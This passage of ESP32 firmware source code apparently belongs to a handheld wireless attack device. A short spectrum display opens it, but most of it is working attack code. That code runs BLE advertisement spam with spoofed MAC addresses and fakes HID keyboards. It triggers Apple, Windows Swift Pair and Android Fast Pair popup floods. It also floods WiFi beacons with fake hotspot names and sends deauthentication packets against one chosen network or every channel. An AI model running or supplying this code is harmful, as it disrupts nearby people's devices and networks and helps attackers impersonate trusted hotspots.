  uint8_t waterfall[128 * (h / 8 + 1)] = {0};
  int nrfCh[13];
  for (int i = 0; i < 13; i++)
    nrfCh[i] = 12 + i * 5;
  displayInfo("WiFi Spectrum", "SEL to exit");
  while (!selPressed()) {
    for (int y = 0; y < h - 1; y++) {
      for (int x = 0; x < w; x++) {
        bool bit = (waterfall[(y + 1) * (w / 8) + x / 8] >> (x % 8)) & 1;
        if (bit)
          waterfall[y * (w / 8) + x / 8] |= (1 << (x % 8));
        else
          waterfall[y * (w / 8) + x / 8] &= ~(1 << (x % 8));
      }
    }
    for (int x = 0; x < w; x++)
      waterfall[(h - 1) * (w / 8) + x / 8] &= ~(1 << (x % 8));
    for (int i = 0; i < 13; i++) {
      if (radio2Active)
        radio2.setChannel(nrfCh[i]);
      delayMicroseconds(150);
      int hits = 0;
      for (int s = 0; s < 5; s++) {
        if (radio2Active && radio2.testRPD())
          hits++;
        delayMicroseconds(80);
      }
      int barH = map(hits, 0, 5, 0, h);
      int x = map(i, 0, 12, 0, w - 1);
      for (int py = h - barH; py < h; py++)
        waterfall[py * (w / 8) + x / 8] |= (1 << (x % 8));
      yield();
    }
    drawWaterfall(waterfall, w, h, "WiFi 1-13", "");
    safeDelay(30);
  }
  if (radio2Active)
    radio2.stopListening();
  initRadios();
}

void runBLESpectrum() {
  stopRadios();
  if (radio2Active) {
    radio2.setAutoAck(false);
    radio2.startListening();
  }
  const int w = 128, h = 40;
  uint8_t waterfall[128 * (h / 8 + 1)] = {0};
  const int bleCh[3] = {2, 26, 80};
  displayInfo("BLE Spectrum", "SEL to exit");
  while (!selPressed()) {
    for (int y = 0; y < h - 1; y++) {
      for (int x = 0; x < w; x++) {
        bool bit = (waterfall[(y + 1) * (w / 8) + x / 8] >> (x % 8)) & 1;
        if (bit)
          waterfall[y * (w / 8) + x / 8] |= (1 << (x % 8));
        else
          waterfall[y * (w / 8) + x / 8] &= ~(1 << (x % 8));
      }
    }
    for (int x = 0; x < w; x++)
      waterfall[(h - 1) * (w / 8) + x / 8] &= ~(1 << (x % 8));
    for (int i = 0; i < 3; i++) {
      if (radio2Active)
        radio2.setChannel(bleCh[i]);
      delayMicroseconds(200);
      int hits = 0;
      for (int s = 0; s < 5; s++) {
        if (radio2Active && radio2.testRPD())
          hits++;
        delayMicroseconds(80);
      }
      int barH = map(hits, 0, 5, 0, h);
      int x = map(i, 0, 2, 20, 108);
      for (int py = h - barH; py < h; py++)
        waterfall[py * (w / 8) + x / 8] |= (1 << (x % 8));
      yield();
    }
    drawWaterfall(waterfall, w, h, "BLE 37-39", "");
    safeDelay(50);
  }
  if (radio2Active)
    radio2.stopListening();
  initRadios();
}

// ==========================================
// BLE SPAM (100+ cihaz)
// ==========================================
static const uint8_t bleAA[4] = {0xD6, 0xBE, 0x89, 0x8E};
static uint8_t blePkt[32];
static const char *blePre[] = {"AirPods",      "JBL",
                               "Sony",         "Samsung",
                               "Xiaomi",       "Beats",
                               "Bose",         "Anker",
                               "Jabra",        "Sennheiser",
                               "Marshall",     "Apple",
                               "Huawei",       "OnePlus",
                               "Nothing",      "Google",
                               "LG",           "Motorola",
                               "Nokia",        "Realme",
                               "Redmi",        "Oppo",
                               "Vivo",         "Philips",
                               "Panasonic",    "Skullcandy",
                               "JVC",          "Audio-Technica",
                               "Shure",        "Bang & Olufsen",
                               "B&O",          "Harman",
                               "AKG",          "Yamaha",
                               "Pioneer",      "Denon",
                               "Marantz",      "Onkyo",
                               "Klipsch",      "Edifier",
                               "Razer",        "Logitech",
                               "Corsair",      "SteelSeries",
                               "HyperX",       "Astro",
                               "Turtle Beach", "Plantronics",
                               "Jabra",        "BlueParrott",
                               "Sennheiser",   "Epos",
                               "Beyerdynamic", "Focal",
                               "Grado",        "Koss",
                               "Meze",         "Audeze",
                               "HIFIMAN",      "STAX",
                               "MrSpeakers",   "Ultimate Ears",
                               "Westone",      "Etymotic",
                               "Campfire",     "64 Audio",
                               "Noble",        "JH Audio"};
static const char *bleSuf[] = {
    " Pro",    " Lite",     " Max",       " 2",      " 3",       " Mini",
    "",        " Plus",     " Ultra",     " ANC",    " TWS",     " Sport",
    " Buds",   " Gen2",     " Gen3",      " LE",     " 4",       " 5",
    " X",      " Neo",      " Classic",   " 2023",   " 2024",    " SE",
    " NC",     " Wireless", " Bluetooth", " True",   " Earbuds", " Headphones",
    " Stereo", " Mono",     " Bass",      " Studio", " DJ",      " Gaming",
    " Pro+",   " Max+",     " S",         " Z",      " A",       " B",
    " C",      " D",        " E"};

static const uint32_t bleOUIList[20] = {
  0x000AD9, // Sony Ericsson
  0x000B86, // Aruba
  0x001958, // Bluetooth SIG
  0x0016B8, // Sony
  0x000006, // Microsoft
  0x00005E, // IANA
  0x00037F, // Atheros
  0x000FDE, // Sony
  0x005043, // Marvell
  0x00000C, // Cisco
  0x0001EC, // Ericsson
  0x0015E0, // Ericsson Mobile
  0x001813, // Sony Mobile
  0x0050F2, // Wi-Fi Alliance
  0x000142, // Cisco
  0x0012EE, // Sony
  0x001620, // Sony
  0x00025A, // Catena
  0x0003BA, // Oracle
  0x00400D  // Avaya
};

void bleRandomMac(uint8_t *mac) {
  if (random(2) == 0) {
    uint32_t oui = bleOUIList[random(20)];
    mac[0] = (oui >> 16) & 0xFF;
    mac[1] = (oui >> 8) & 0xFF;
    mac[2] = oui & 0xFF;
    mac[3] = random(256);
    mac[4] = random(256);
    mac[5] = random(256);
  } else {
    for (int i = 0; i < 6; i++)
      mac[i] = random(256);
    mac[0] |= 0xC0;
  }
}
void bleRandomName(uint8_t *name, int maxLen) {
  const char *pre = blePre[random(60)];
  const char *suf = bleSuf[random(40)];
  int len = strlen(pre) + strlen(suf);
  if (len > maxLen)
    len = maxLen;
  memcpy(name, pre, strlen(pre));
  memcpy(name + strlen(pre), suf, strlen(suf));
  name[len] = 0;
}
uint32_t bleCrc(const uint8_t *data, int len, uint32_t crc) {
  for (int i = 0; i < len; i++) {
    crc ^= data[i];
    for (int j = 0; j < 8; j++) {
      if (crc & 1)
        crc = (crc >> 1) ^ 0x8C;
      else
        crc >>= 1;
    }
  }
  return crc;
}
void bleSendPacket(int ch, uint8_t *mac, uint8_t *pdu, int len) {
  uint8_t rfChan = (ch == 37) ? 2 : (ch == 38) ? 26 : 80;
  int pos = 0;
  blePkt[pos++] = 0xAA;
  memcpy(&blePkt[pos], bleAA, 4);
  pos += 4;
  uint8_t hdr = (len & 0x3F) | 0x40;
  blePkt[pos++] = hdr;
  blePkt[pos++] = len;
  memcpy(&blePkt[pos], mac, 6);
  pos += 6;
  memcpy(&blePkt[pos], pdu, len);
  pos += len;
  uint32_t crc = bleCrc(&blePkt[5], pos - 5, 0x555555);
  blePkt[pos++] = crc & 0xFF;
  blePkt[pos++] = (crc >> 8) & 0xFF;
  blePkt[pos++] = (crc >> 16) & 0xFF;

  // DUAL nRF24L01+PA+LNA SIMULTANEOUS TRANSMISSION ENGINE
  if (radio1Active) {
    radio.setChannel(rfChan);
    radio.writeFast(blePkt, pos);
    radio.txStandBy();
  }
  if (radio2Active) {
    radio2.setChannel(rfChan);
    radio2.writeFast(blePkt, pos);
    radio2.txStandBy();
  }
}
void bleInitRadio() {
  stopRadios();
  if (radio1Active) {
    radio.begin(&spiBus);
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_1MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.setAddressWidth(4);
    radio.openWritingPipe(bleAA);
  }
  if (radio2Active) {
    radio2.begin(&spiBus);
    radio2.setAutoAck(false);
    radio2.stopListening();
    radio2.setRetries(0, 0);
    radio2.setPALevel(RF24_PA_MAX, true);
    radio2.setDataRate(RF24_1MBPS);
    radio2.setCRCLength(RF24_CRC_DISABLED);
    radio2.setAddressWidth(4);
    radio2.openWritingPipe(bleAA);
  }
}
void runBLESpam() {
  displayInfo("BLE SPAM", "Init...");
  bleInitRadio();
  safeDelay(500);
  uint8_t mac[6], adv[31];
  int ch = 37;
  unsigned long last = 0;
  displayInfo("BLE SPAM", "Spamming...", "100+ devices", "SEL to stop");
  while (!selPressed()) {
    if (millis() - last > 80) {
      bleRandomMac(mac);
      int advLen = 0;
      uint8_t name[20];
      bleRandomName(name, 15);
      int nlen = strlen((char *)name);
      adv[advLen++] = 2;
      adv[advLen++] = 0x01;
      adv[advLen++] = 0x06;
      adv[advLen++] = nlen + 1;
      adv[advLen++] = 0x09;
      memcpy(&adv[advLen], name, nlen);
      advLen += nlen;
      adv[advLen++] = 5;
      adv[advLen++] = 0xFF;
      for (int i = 0; i < 4; i++)
        adv[advLen++] = random(256);
      bleSendPacket(ch, mac, adv, advLen);
      ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
      last = millis();
    }
    yield();
  }
  initRadios();
}

// ==========================================
// BLE BADUSB (HID Klavye Spam)
// ==========================================
static const char *hidNames[] = {
    "Magic Keyboard", "Logi K380",       "Apple Keyboard", "Dell KB",
    "HP Wireless",    "Microsoft KB",    "Keychron K2",    "Razer KB",
    "Corsair K70",    "SteelSeries Apex"};
static const uint8_t hidUUID[] = {0x00, 0x00, 0x18, 0x12, 0x00, 0x10, 0x00,
                                  0x80, 0x00, 0x80, 0x05, 0x9B, 0x34, 0xFB};

void runBLEBadUSB() {
  displayInfo("BLE BadUSB", "Init HID spam...");
  bleInitRadio();
  safeDelay(500);
  uint8_t mac[6], adv[31];
  int ch = 37;
  unsigned long last = 0;
  displayInfo("BLE BadUSB", "HID Keyboard spam", "10+ devices", "SEL to stop");
  while (!selPressed()) {
    if (millis() - last > 100) {
      bleRandomMac(mac);
      int advLen = 0;
      adv[advLen++] = 2;
      adv[advLen++] = 0x01;
      adv[advLen++] = 0x06;
      const char *name = hidNames[random(10)];
      int nlen = strlen(name);
      adv[advLen++] = nlen + 1;
      adv[advLen++] = 0x09;
      memcpy(&adv[advLen], name, nlen);
      advLen += nlen;
      adv[advLen++] = 3;
      adv[advLen++] = 0x02;
      memcpy(&adv[advLen], hidUUID, 2);
      advLen += 2;
      adv[advLen++] = 2;
      adv[advLen++] = 0x0A;
      adv[advLen++] = 0x00;
      bleSendPacket(ch, mac, adv, advLen);
      ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
      last = millis();
    }
    yield();
  }
  initRadios();
}

// ==========================================
// BRUCE FIRMWARE ATTACKS: APPLE JUICE (SOUR APPLE / iOS POPUP)
// ==========================================
void runAppleJuiceSpam() {
  displayInfo("SourApple Spam", "Init iOS Popups...");
  bleInitRadio();
  safeDelay(500);
  uint8_t mac[6], adv[31];
  int ch = 37;
  unsigned long last = 0;
  
  // Apple Model IDs (AirPods Pro, AirPods Max, AirTag, Setup Popup etc.)
  const uint16_t appleModels[] = {0x0E20, 0x0A20, 0x0220, 0x0F20, 0x0320, 0x0B20, 0x0518, 0x2001};

  displayInfo("SourApple Spam", "Spamming iOS...", "AirPods/TV Popups", "SEL to stop");
  while (!selPressed()) {
    if (millis() - last > 60) {
      bleRandomMac(mac);
      int advLen = 0;
      // Flags
      adv[advLen++] = 2;
      adv[advLen++] = 0x01;
      adv[advLen++] = 0x06;

      // Manufacturer Data Length (Apple 0x004C)
      adv[advLen++] = 23;
      adv[advLen++] = 0xFF;
      adv[advLen++] = 0x4C; // Apple ID Low
      adv[advLen++] = 0x00; // Apple ID High
      adv[advLen++] = 0x0F; // Continuity Type: Proximity Pair
      adv[advLen++] = 0x18; // Length
      adv[advLen++] = 0x01; // Prefix

      uint16_t model = appleModels[random(8)];
      adv[advLen++] = (model >> 8) & 0xFF;
      adv[advLen++] = model & 0xFF;

      for (int i = 0; i < 15; i++) {
        adv[advLen++] = random(256);
      }

      bleSendPacket(ch, mac, adv, advLen);
      ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
      last = millis();
    }
    yield();
  }
  initRadios();
}

// ==========================================
// BRUCE FIRMWARE ATTACKS: WINDOWS SWIFT PAIR
// ==========================================
void runSwiftPairSpam() {
  displayInfo("SwiftPair Spam", "Init Win Popups...");
  bleInitRadio();
  safeDelay(500);
  uint8_t mac[6], adv[31];
  int ch = 37;
  unsigned long last = 0;

  displayInfo("SwiftPair Spam", "Spamming Win10/11", "SEL to stop");
  while (!selPressed()) {
    if (millis() - last > 70) {
      bleRandomMac(mac);
      int advLen = 0;
      adv[advLen++] = 2;
      adv[advLen++] = 0x01;
      adv[advLen++] = 0x06;

      // Microsoft Swift Pair (0x0006)
      adv[advLen++] = 9;
      adv[advLen++] = 0xFF;
      adv[advLen++] = 0x06; // Microsoft ID Low
      adv[advLen++] = 0x00; // Microsoft ID High
      adv[advLen++] = 0x03; // Swift Pair Subtype
      adv[advLen++] = 0x01;

      for (int i = 0; i < 4; i++) adv[advLen++] = random(256);

      bleSendPacket(ch, mac, adv, advLen);
      ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
      last = millis();
    }
    yield();
  }
  initRadios();
}

// ==========================================
// BRUCE FIRMWARE ATTACKS: ANDROID FAST PAIR
// ==========================================
void runFastPairSpam() {
  displayInfo("FastPair Spam", "Init Android...");
  bleInitRadio();
  safeDelay(500);
  uint8_t mac[6], adv[31];
  int ch = 37;
  unsigned long last = 0;

  const uint32_t modelIDs[] = {0x2C2B29, 0xF2B93D, 0x000002, 0x82C789};

  displayInfo("FastPair Spam", "Spamming Android", "SEL to stop");
  while (!selPressed()) {
    if (millis() - last > 70) {
      bleRandomMac(mac);
      int advLen = 0;
      adv[advLen++] = 2;
      adv[advLen++] = 0x01;
      adv[advLen++] = 0x06;

      // Google Fast Pair Service (0xFE2C)
      adv[advLen++] = 6;
      adv[advLen++] = 0x16; // Service Data
      adv[advLen++] = 0x2C;
      adv[advLen++] = 0xFE;

      uint32_t model = modelIDs[random(4)];
      adv[advLen++] = (model >> 16) & 0xFF;
      adv[advLen++] = (model >> 8) & 0xFF;
      adv[advLen++] = model & 0xFF;

      bleSendPacket(ch, mac, adv, advLen);
      ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
      last = millis();
    }
    yield();
  }
  initRadios();
}

// ==========================================
// BRUCE FIRMWARE ATTACKS: RICKROLL BEACON FLOOD
// ==========================================
// ==========================================
// DAHİLİ EKRAN KLAVYESİ (OLED ON-SCREEN KEYBOARD)
// ==========================================
String showOledKeyboard(const char *title) {
  const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-. ";
  int charsetLen = strlen(charset);
  int cursor = 0;
  String text = "";

  while (true) {
    display.clearDisplay();
    drawStatusBar();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 10);
    display.print(title);

    // Text Display Box
    display.drawRect(0, 20, 128, 14, SSD1306_WHITE);
    display.setCursor(4, 23);
    display.print(text);
    display.print("_");

    // Keyboard Cursor Display
    display.setCursor(0, 38);
    if (cursor < charsetLen) {
      display.print("Char: [ ");
      display.print(charset[cursor]);
      display.print(" ]");
    } else if (cursor == charsetLen) {
      display.print("Action: [ ENTER / OK ]");
    } else {
      display.print("Action: [ DELETE ]");
    }

    display.setCursor(0, 52);
    display.print("UP/DN:nav SEL:select");
    display.display();

    if (upPressed()) {
      cursor = (cursor + 1) % (charsetLen + 2);
    }
    if (downPressed()) {
      cursor = (cursor + charsetLen + 2 - 1) % (charsetLen + 2);
    }
    if (selPressed()) {
      if (cursor == charsetLen) { // OK
        if (text.length() > 0)
          return text;
      } else if (cursor == charsetLen + 1) { // DEL
        if (text.length() > 0)
          text.remove(text.length() - 1);
      } else {
        if (text.length() < 31)
          text += charset[cursor];
      }
    }
    yield();
  }
}

// ==========================================
// TARGET SSIDS IN FLASH MEMORY (PROGMEM RAM-SAVER)
// ==========================================
static const char targetSSIDs[] PROGMEM =
  "c6Xyu1%R%tBet4qFQ!66gTJbauEqtaw\n"
  "0el*HbYdS!e*7UlQDa*Th1VBWQ5ogHp\n"
  "$zE#*9zUeITOGxt!@rIDWMT4lQ5w4^!\n"
  "TSMU3rXHT#8WkeD8KwJ%e6KWp3MTvqt\n"
  "PS7dk7u8W1RXTf#pNdKDnJFUZNqT!pB\n"
  "50!xw27tJjl7RpsAYsVbiHC%VBByACL\n"
  "pmiwHrfdPj&s*zXVK3&j2R56JL&klXP\n"
  "pD2X!Sjaepp4riFsPW5LHccf*$3%GQz\n"
  "i2Rt1qFcjeQN@8PVLXlfVPSd^U3NVIm\n"
  "%E^we!aDmfikzR4Zq#%ug!ChSvE2ieD\n"
  "S!0HjrbWhPuCfAG1a%Fvgx6@^zVzpTy\n"
  "Fd7H&Yuao&@gxhvKbw8VlmSOWHafUzG\n"
  "rmNMYvJMd$*2j9!ob#X9QMP6EAv#Y6p\n"
  "ky3x0GNQhploIXSvAGF@ilrP$OB!jXY\n"
  "qJZ1jUz!0t*ctNR!0lQw40a$SvhhWV1\n"
  "tV#OSjg!PyOc!yGuvpD@sy1PuMW@eJD\n"
  "vsY$gRwC8ojh@6RC%gsLXT*SAxX4@%5\n"
  "7hRYJtXAmTRj!h2m6*VSoFf0tkGhJVu\n"
  "sUftTT#kkRtx3O&A3^bjDsX3tQRbPYX\n"
  "ijisdioahiofhasihe2i13ioh1as992\n"
  "EwzOHje*Z5s&ftDG2lf4w&pB2vDVI4u\n"
  "OVEAKltApxmz5ozj9#u^Asok*wYeTj8\n"
  "ZN5Z&@D68l%v5%@cxUv5tDEgRf4*n*k\n"
  "zu5xMAx5lK&*jstrX40#fp2jWdyzVox\n"
  "TTI5bSSk*xsws*#NN7oHhjHN^eiVa%M\n"
  "myow7acI%*hano9UjpG@Db!3#dKb7F&\n"
  "8agu!VIuUBEO2*EdfH4vDz@$rs4To*j\n"
  "U@C&lth@ZgO%*zB2AD0rdn$4B4bjV2z\n"
  "6$MLLGzrK%6RCk6%EQJ2rpIPLe@w^gI\n"
  "qXhW#Tz20HbljCy5nGcTWrhhln72kx4\n"
  "KBgldjuIs7jDiS@LIR!aaBOeyr4pc7J\n"
  "C0h@fmOiBhHZX&bk5b0Uc80O7@JVflx\n"
  "YfeEK4iCV^MqtDDC1^@#GMiLl!X2eyf\n"
  "S9kC*UKb$86jQi*ne!jLG6byYWC9X@O\n"
  "xmcjYNB18OtFScjdBnw9$yT%1GOpnbD\n"
  "y*0AjXud@E@pQEGD6dZq$0Vt4OxW$2f\n"
  "0bX%6l!SzmNjg9FYpgKgBQ4gfQRTWYU\n"
  "gozkYpnrRTuTTHXbJKl#flfmB*87EgD\n"
  "wpovP$C51sVS#PDxw56NKyAZZ!UPd$*\n"
  "pSN6YGvakIZwgUi#JNyx&FFaFq@W^%s\n"
  "LgVNK#&gE7sz2B1FGr0vBEguR%7Citw\n"
  "DaTGOj45NudUzMA^Rg0Q*eAOFuLh@f3\n"
  "YLyi9Cu7jHoK$#CIwXk8XCdVJEa^WS2\n";

// RSN WPA2 Information Element Tag Payload (26 bytes)
static const uint8_t PROGMEM rsnWpa2Tag[26] = {
  0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02,
  0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f,
  0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02,
  0x00, 0x00
};

// ==========================================
// ADVANCED 802.11 BEACON FLOOD ENGINE
// ==========================================
void runWiFiBeaconFlood() {
  stopRadios();
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous(true);

  int mode = 0; // 0: Custom Typed, 1: Flash PROGMEM List (43 SSIDs), 2: Infinite Random, 3: Famous, 4: Rickroll
  int subSel = 0;
  while (!selPressed()) {
    display.clearDisplay();
    drawStatusBar();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 10);
    display.println("BEACON ENGINE MODE");
    display.setCursor(0, 22); display.print(subSel == 0 ? ">" : " "); display.println("1. Custom Type (Keybd)");
    display.setCursor(0, 31); display.print(subSel == 1 ? ">" : " "); display.println("2. Flash List (43 WPA2)");
    display.setCursor(0, 40); display.print(subSel == 2 ? ">" : " "); display.println("3. Infinite Random APs");
    display.setCursor(0, 49); display.print(subSel == 3 ? ">" : " "); display.println("4. Famous Hotspots");
    display.setCursor(0, 58); display.print(subSel == 4 ? ">" : " "); display.println("5. Rickroll Lyrics");
    display.display();

    if (upPressed()) subSel = (subSel + 4) % 5;
    if (downPressed()) subSel = (subSel + 1) % 5;
    if (selPressed()) {
      mode = subSel;
      break;
    }
    yield();
  }

  String customSsid = "";
  if (mode == 0) {
    customSsid = showOledKeyboard("ENTER CUSTOM SSID");
  }

  uint8_t pkt[150];
  int chan = 1;
  uint32_t beaconSent = 0;
  uint8_t baseMac[6];
  for (int i = 0; i < 6; i++) baseMac[i] = random(256);
  baseMac[0] = (baseMac[0] & 0xFE) | 0x02; // Local Admin MAC

  displayInfo("Beacon Flooding", "Broadcasting...", "SEL to stop");
  safeDelay(500);

  int totalListLength = strlen_P(targetSSIDs);

  while (!selPressed()) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    chan = (chan % 13) + 1;

    if (mode == 1) {
      // Loop through all 43 PROGMEM SSIDs
      int i = 0;
      int ssidNum = 1;
      while (i < totalListLength && !selPressed()) {
        int j = 0;
        char c;
        do {
          c = pgm_read_byte(targetSSIDs + i + j);
          j++;
        } while (c != '\n' && j <= 32 && (i + j) < totalListLength);

        uint8_t sLen = j - 1;
        baseMac[5] = ssidNum++; // Auto-increment BSSID MAC for each SSID
        esp_wifi_set_mac(WIFI_IF_AP, baseMac);

        memset(pkt, 0, 150);
        pkt[0] = 0x80; pkt[1] = 0x00; // 802.11 Beacon Management Frame
        memcpy(pkt + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
        memcpy(pkt + 10, baseMac, 6);
        memcpy(pkt + 16, baseMac, 6);
        pkt[22] = random(256); pkt[23] = random(256);

        int pos = 24;
        memset(pkt + pos, 0, 8); pos += 8; // Timestamp
        pkt[pos++] = 0x64; pkt[pos++] = 0x00; // Beacon Interval
        pkt[pos++] = 0x31; pkt[pos++] = 0x00; // Capabilities: ESS + WPA2

        // SSID Tag
        pkt[pos++] = 0x00;
        pkt[pos++] = sLen;
        memcpy_P(pkt + pos, targetSSIDs + i, sLen);
        pos += sLen;

        // Supported Rates Tag
        pkt[pos++] = 0x01; pkt[pos++] = 0x08;
        pkt[pos++] = 0x82; pkt[pos++] = 0x84; pkt[pos++] = 0x8b; pkt[pos++] = 0x96;
        pkt[pos++] = 0x0c; pkt[pos++] = 0x12; pkt[pos++] = 0x18; pkt[pos++] = 0x24;

        // DS Parameter (Channel Tag)
        pkt[pos++] = 0x03; pkt[pos++] = 0x01;
        pkt[pos++] = chan;

        // RSN WPA2 Tag
        memcpy_P(pkt + pos, rsnWpa2Tag, 26);
        pos += 26;

        // Transmit 3 times per SSID for 100% reception reliability
        for (int tx = 0; tx < 3; tx++) {
          if (esp_wifi_80211_tx(WIFI_IF_AP, pkt, pos, false) == 0) {
            beaconSent++;
          }
          delay(2);
        }

        i += j;

        display.clearDisplay();
        drawStatusBar();
        display.setTextSize(1);
        display.setTextColor(SSD1306_WHITE);
        display.setCursor(0, 10);
        display.print("FLOOD: PROGMEM (43)");
        display.setCursor(0, 24);
        display.print("AP: #"); display.print(ssidNum - 1); display.print("/"); display.print(43);
        display.setCursor(0, 38);
        display.print("Ch: "); display.print(chan); display.print(" Pkt: "); display.print(beaconSent);
        display.setCursor(0, 52);
        display.print("SEL: stop & exit");
        display.display();
        yield();
      }
    } else {
      // Dynamic modes (Custom, Infinite Random, Famous, Rickroll)
      String currentSsid = "";
      if (mode == 0) {
        currentSsid = customSsid;
      } else if (mode == 2) {
        const char *prefixes[] = {"Free_WiFi_", "Guest_AP_", "Public_", "Router_", "Hotspot_", "Cyber_"};
        currentSsid = String(prefixes[random(6)]) + String(random(100, 9999));
      } else if (mode == 3) {
        const char *fakes[] = {"FreeWiFi", "Starbucks", "McDonalds", "AirportWiFi", "HotelGuest", "AndroidAP", "iPhone", "HomeWiFi"};
        currentSsid = String(fakes[random(8)]);
      } else {
        const char *rick[] = {"01-Never Gonna", "02-Give You Up", "03-Never Gonna", "04-Let You Down", "05-Never Gonna", "06-Run Around", "07-And Desert You"};
        currentSsid = String(rick[random(7)]);
      }

      for (int j = 0; j < 6; j++) baseMac[j] = random(256);
      baseMac[0] = (baseMac[0] & 0xFE) | 0x02;
      esp_wifi_set_mac(WIFI_IF_AP, baseMac);

      memset(pkt, 0, 150);
      pkt[0] = 0x80; pkt[1] = 0x00;
      memcpy(pkt + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
      memcpy(pkt + 10, baseMac, 6);
      memcpy(pkt + 16, baseMac, 6);
      pkt[22] = random(256); pkt[23] = random(256);

      int pos = 24;
      memset(pkt + pos, 0, 8); pos += 8;
      pkt[pos++] = 0x64; pkt[pos++] = 0x00;
      pkt[pos++] = 0x31; pkt[pos++] = 0x00;

      int sLen = currentSsid.length();
      if (sLen > 31) sLen = 31;
      pkt[pos++] = 0x00;
      pkt[pos++] = sLen;
      memcpy(pkt + pos, currentSsid.c_str(), sLen);
      pos += sLen;

      pkt[pos++] = 0x01; pkt[pos++] = 0x08;
      pkt[pos++] = 0x82; pkt[pos++] = 0x84; pkt[pos++] = 0x8b; pkt[pos++] = 0x96;
      pkt[pos++] = 0x0c; pkt[pos++] = 0x12; pkt[pos++] = 0x18; pkt[pos++] = 0x24;

      pkt[pos++] = 0x03; pkt[pos++] = 0x01;
      pkt[pos++] = chan;

      memcpy_P(pkt + pos, rsnWpa2Tag, 26);
      pos += 26;

      for (int tx = 0; tx < 3; tx++) {
        if (esp_wifi_80211_tx(WIFI_IF_AP, pkt, pos, false) == 0) {
          beaconSent++;
        }
        delay(2);
      }

      display.clearDisplay();
      drawStatusBar();
      display.setTextSize(1);
      display.setTextColor(SSD1306_WHITE);
      display.setCursor(0, 10);
      display.print("BEACON FLOODING");
      display.setCursor(0, 24);
      display.print("SSID: "); display.println(currentSsid);
      display.setCursor(0, 38);
      display.print("Ch: "); display.print(chan);
      display.print(" Pkt: "); display.print(beaconSent);
      display.setCursor(0, 52);
      display.print("SEL: stop & exit");
      display.display();

      delay(2);
      yield();
    }
  }

  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

void runRickrollBeacon() {
  runWiFiBeaconFlood();
}

// ==========================================
// WiFi DEAUTH
// ==========================================
static bool deauthActive = false;
static uint8_t deauthBSSID[6];
static uint16_t deauthChannel = 0;
static bool deauthAll = false;

void deauthTask(void *pv) {
  uint8_t packet[26];
  memset(packet, 0, 26);
  packet[0] = 0xC0;
  packet[1] = 0x00;
  packet[2] = 0x00;
  packet[3] = 0x00;
  while (deauthActive) {
    if (deauthAll) {
      for (int ch = 1; ch <= 13; ch++) {
        if (!deauthActive)
          break;
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        uint8_t spoofed[6];
        for (int i = 0; i < 6; i++)
          spoofed[i] = random(256);
        esp_wifi_set_mac(WIFI_IF_AP, spoofed);
        memcpy(packet + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
        memcpy(packet + 10, spoofed, 6);
        memcpy(packet + 16, spoofed, 6);
        for (int i = 0; i < 5; i++) {
          esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false);
          delay(5);
        }
      }
    } else {
      esp_wifi_set_channel(deauthChannel, WIFI_SECOND_CHAN_NONE);
      esp_wifi_set_mac(WIFI_IF_AP, deauthBSSID);
      memcpy(packet + 4, deauthBSSID, 6);
      memcpy(packet + 10, deauthBSSID, 6);
      memcpy(packet + 16, deauthBSSID, 6);
      for (int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false);
        delay(1);
      }
    }
    yield();
  }
  vTaskDelete(NULL);
}
void startDeauthTask(bool all = false) {
  deauthActive = true;
  deauthAll = all;
  xTaskCreatePinnedToCore(deauthTask, "deauth", 4096, NULL, 1, NULL, 1);
}
void stopDeauth() {
  deauthActive = false;
  safeDelay(100);
}

void runWiFiDeauthSingle() {
  stopRadios();
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous(true);
  int n = WiFi.scanNetworks();
  if (n == 0) {
    displayInfo("No networks");
    safeDelay(2000);
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    recoverFromWiFi();
    return;
  }
  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay();
    drawStatusBar();
    display.setTextSize(1);
    display.setTextColor(1);
    display.setCursor(0, 10);
    display.print("AP:");
    display.print(sel + 1);
    display.print("/");
    display.println(n);
    display.setCursor(0, 22);
    display.println(WiFi.SSID(sel));
    display.setCursor(0, 34);
    display.print("Ch:");
    display.print(WiFi.channel(sel));
    display.display();
    if (upPressed())
      sel = (sel == 0) ? n - 1 : sel - 1;
    if (downPressed())
      sel = (sel + 1) % n;
    yield();
  }
  memcpy(deauthBSSID, WiFi.BSSID(sel), 6);
  deauthChannel = WiFi.channel(sel);
  displayInfo("Deauthing", WiFi.SSID(sel), "SEL to stop");
  startDeauthTask(false);
  while (!selPressed())
    yield();
  stopDeauth();
  WiFi.scanDelete();
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

void runWiFiDeauthAll() {
  stopRadios();
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous(true);
  displayInfo("Deauth ALL", "All channels", "SEL to stop");
  startDeauthTask(true);
  while (!selPressed())
    yield();
  stopDeauth();
  esp_wifi_set_promiscuous(false);
